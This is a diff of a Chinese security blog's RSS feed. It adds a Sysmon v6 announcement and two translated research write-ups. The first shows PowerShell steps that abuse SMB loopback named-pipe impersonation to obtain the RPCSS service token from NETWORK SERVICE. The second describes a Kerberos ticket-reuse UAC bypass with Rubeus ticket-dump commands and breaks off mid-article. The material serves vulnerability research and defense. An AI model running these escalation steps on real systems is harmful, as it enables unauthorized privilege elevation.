@@ -6,13 +6,222 @@
         <description>Recent content in Windows安全 on 办公AI智能小助手</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <copyright>qife</copyright><atom:link href="http://localhost:1313/tags/windows%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <copyright>qife</copyright>
+        <lastBuildDate>Sat, 02 Aug 2025 03:38:35 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/windows%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Sysmon v6 安全监控工具发布公告：增强Windows系统安全事件追踪能力</title>
+        <link>http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/</link>
+        <pubDate>Sat, 02 Aug 2025 03:38:35 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/</guid>
+        <description>&lt;h1 id=&#34;工具发布公告sysmon-v6安全监控工具&#34;&gt;工具发布公告：Sysmon v6安全监控工具
+&lt;/h1&gt;&lt;p&gt;Sysmon正在持续进化。&lt;br&gt;
+我们很高兴宣布@markrussinovich和@mxatone已发布Sysmon v6版本。两年前首次讨论Sysmon v2时仅支持7种事件类型，如今已扩展至19种事件类型外加错误事件。从Mark在RSA大会的演示中可以看到新增的3种v6事件类型（已高亮显示）。&lt;/p&gt;
+&lt;h2 id=&#34;sysmon事件类型&#34;&gt;Sysmon事件类型
+&lt;/h2&gt;&lt;p&gt;&amp;ldquo;本次发布的Sysmon作为后台监控工具，可将系统活动记录到事件日志中用于安全事件检测和取证。新版本新增了事件模式显示选项、配置变更事件记录、标准化注册表路径显示，以及命名管道创建和连接事件监控功能。&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;Mark的演示包含了Sysmon优化运行的基础事件推荐配置：&lt;/p&gt;
+&lt;h3 id=&#34;基础事件推荐配置&#34;&gt;基础事件推荐配置
+&lt;/h3&gt;&lt;p&gt;（图表内容：进程创建/终止、网络连接、文件创建时间变更等核心监控项）&lt;/p&gt;
+&lt;h3 id=&#34;基础事件推荐配置续&#34;&gt;基础事件推荐配置（续）
+&lt;/h3&gt;&lt;p&gt;（图表内容：WMI事件、驱动程序加载、跨进程注入等高级监控项）&lt;/p&gt;
+&lt;p&gt;强烈建议采用这些推荐配置进行部署。初学者可使用Sysmon配置模板快速上手，如@SwiftOnSecurity在Github提供的sysmon-config-export.xml。该模板特点包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;每行配置均有详细注释&lt;/li&gt;
+&lt;li&gt;按功能分区并附带解释说明&lt;/li&gt;
+&lt;li&gt;兼具Sysmon教学指南功能&lt;/li&gt;
+&lt;li&gt;涵盖Windows系统关键监控区域&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;部署命令示例：&lt;br&gt;
+&lt;code&gt;sysmon.exe -accepteula -i sysmonconfig-export.xml&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;实战演示驱动加载检测&#34;&gt;实战演示：驱动加载检测
+&lt;/h2&gt;&lt;p&gt;通过WinPMEM内存取证工具加载内核驱动时，Sysmon准确捕获了Event ID 6（驱动加载）事件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WinPMEM执行命令：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winpmem_2.1.post4.exe -l -d winpmem.sys
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Windows事件查看器对应日志：&lt;br&gt;
+&lt;code&gt;Applications and Services Logs/Microsoft/Windows/Sysmon/Operational&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;最后附上Mark提出的Sysmon最佳实践要点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;全环境部署（包括工作站和服务器）&lt;/li&gt;
+&lt;li&gt;结合威胁情报优化配置&lt;/li&gt;
+&lt;li&gt;建立事件响应流程&lt;/li&gt;
+&lt;li&gt;集中化日志收集与分析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;立即部署Sysmon v6，全面提升您的安全监控能力！&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Windows登录会话共享漏洞：突破服务加固隔离的技术分析</title>
+        <link>http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sat, 02 Aug 2025 02:55:08 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;windows登录会话的过度共享&#34;&gt;Windows登录会话的过度共享
+&lt;/h3&gt;&lt;p&gt;Windows的登录会话通常与单个经过身份验证的用户及其令牌绑定。然而对于服务账户而言情况并非如此——在服务加固机制下，同一个登录会话中可能存在多个带有不同服务组的令牌。本文将展示这种共享机制如何破坏服务加固的隔离性（至少对NETWORK SERVICE账户有效），并再次强调S-1-1-0并非安全边界。&lt;/p&gt;
+&lt;h4 id=&#34;技术核心lsass令牌缓存机制&#34;&gt;技术核心：LSASS令牌缓存机制
+&lt;/h4&gt;&lt;p&gt;当LSASS为新登录会话创建令牌时，会存储该令牌以供后续检索。虽然大多数场景下这个机制无显著作用，但在网络认证时会被重新启用。观察&lt;code&gt;AcquireCredentialsHandle&lt;/code&gt;API的原型时会发现&lt;code&gt;pvLogonID&lt;/code&gt;参数，其说明指出：&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;指向标识用户的本地唯一标识符(LUID)。此参数为文件系统进程（如网络重定向器）提供。该参数可为NULL。&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;拥有TCB权限时，此参数可指定用于网络认证的登录会话ID（从令牌视角看即认证ID）。虽然常规网络认证中令牌无法跨机器跟随，但在&lt;strong&gt;本地环回认证&lt;/strong&gt;场景下，服务端协商获得的令牌将是会话令牌而非调用方令牌。&lt;/p&gt;
+&lt;h4 id=&#34;利用smb实现权限提升&#34;&gt;利用SMB实现权限提升
+&lt;/h4&gt;&lt;p&gt;关键线索在于说明中的&amp;quot;网络重定向器&amp;quot;。最易访问且支持本地环回认证的重定向器是什么？&lt;strong&gt;SMB协议&lt;/strong&gt;。它是否提供获取网络认证令牌的原语？&lt;strong&gt;命名管道&lt;/strong&gt;。SMB是否以内核模式进行网络认证从而具备TCB特权？确实如此。&lt;/p&gt;
+&lt;h4 id=&#34;漏洞复现windows-10-1909环境&#34;&gt;漏洞复现（Windows 10 1909环境）
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;首先需要NETWORK SERVICE权限的PowerShell进程（可通过作者前文方法实现）&lt;/li&gt;
+&lt;li&gt;创建命名管道并监听连接：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-NtNamedPipeFile&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Win32Path&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Start-Job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Listen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;通过本地主机访问管道：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-NtFile&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Win32Path&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Wait-Job&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Null&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在模拟命名管道时打开RPCSS进程：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Use-NtObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Impersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Get-NtProcess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ProcessId&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1152&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;此时获得的访问权限为&lt;code&gt;AllAccess&lt;/code&gt;，因为LSASS存储的是该登录会话中首个令牌（即RPCSS进程的令牌）。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;技术验证&#34;&gt;技术验证
+&lt;/h4&gt;&lt;p&gt;检查模拟令牌的组列表可确认该令牌属于RPCSS服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Use-NtObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Impersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Get-NtToken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Impersonation&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Groups&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-Match&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rpcss&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;输出显示&lt;code&gt;NT SERVICE\RpcSs&lt;/code&gt;组的存在，证实了令牌来源。&lt;/p&gt;
+&lt;h4 id=&#34;影响范围&#34;&gt;影响范围
+&lt;/h4&gt;&lt;p&gt;此特性存在于所有登录会话，但普通用户会话的利用价值较低。需注意的是：当以NETWORK SERVICE身份访问管理共享时，实际会以RPCSS服务身份认证，可能访问该服务SID创建的文件。本文仅抛砖引玉，相信读者能发掘更多创造性利用方式。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>以最复杂方式绕过UAC：Kerberos协议漏洞利用详解</title>
+        <link>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</link>
+        <pubDate>Fri, 01 Aug 2025 23:30:05 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BB%A5%E6%9C%80%E5%A4%8D%E6%9D%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87uackerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid>
+        <description>&lt;h1 id=&#34;以最复杂方式绕过uac&#34;&gt;以最复杂方式绕过UAC
+&lt;/h1&gt;&lt;p&gt;虽然我不常研究这个，但发现新的UAC绕过方法总是很有趣。在阅读Rubeus工具的功能时，我意识到可以滥用Kerberos协议绕过UAC——至少在域加入系统中可行。不清楚之前是否有人记录过这种方法，有篇帖子讨论过类似技术但需要从其他系统发起攻击，而本文将描述本地实现的方案。&lt;/p&gt;
+&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
+&lt;/h2&gt;&lt;p&gt;系统默认会通过LSASS过滤网络身份验证令牌，移除本地管理员的权限。但存在关键例外：如果用户是域用户兼本地管理员，LSASS会允许网络认证使用完整管理员令牌。这在通过Kerberos进行本地认证时会产生问题——难道这不是简单的UAC绕过吗？&lt;/p&gt;
+&lt;p&gt;实际上Kerberos有专门机制阻止这种攻击。去年我阅读了微软工程师Steve Syfuhs关于Kerberos如何防止本地UAC绕过的文章。简而言之：当用户请求服务票据时，LSASS会在TGS-REQ请求中嵌入本地安全信息，这些信息会被编码到生成的票据中。当该票据用于本地系统认证时，Kerberos会提取这些信息进行验证。&lt;/p&gt;
+&lt;p&gt;通过分析Kerberos票据，我们发现两个关键字段：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_AD_RESTRICTION_ENTRY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Flags&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LimitedToken&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Integrity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Level&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Medium&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Machine&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6640665F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authorization&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;KERB_LOCAL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Security&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;60CE03337E01000025FC763900000000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;核心绕过机制&#34;&gt;核心绕过机制
+&lt;/h2&gt;&lt;p&gt;LSASS通过&lt;code&gt;LsaISetSupplementalTokenInfo&lt;/code&gt;函数处理这些字段，主要检查包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;比较票据中的MachineID与LSASS内存中的值&lt;/li&gt;
+&lt;li&gt;检查未公开的LSA网络令牌过滤标志&lt;/li&gt;
+&lt;li&gt;验证用户SID是否属于本地账户域&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;当满足以下任一条件时过滤将失效：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户SID不属于本地账户域&lt;/li&gt;
+&lt;li&gt;LocalAccountTokenFilterPolicy策略非零&lt;/li&gt;
+&lt;li&gt;系统是域控制器(NtProductLanManNt)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;两种具体利用方法&#34;&gt;两种具体利用方法
+&lt;/h2&gt;&lt;h3 id=&#34;方法一票据重用攻击&#34;&gt;方法一：票据重用攻击
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;获取本地系统的服务票据并保存&lt;/li&gt;
+&lt;li&gt;重启系统使LSASS重新初始化&lt;/li&gt;
+&lt;li&gt;重新加载旧票据，此时MachineID不匹配导致过滤失效&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;klist&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$env:COMPUTERNAME&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nowrap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 保存Base64票据后重启&lt;/span&gt;
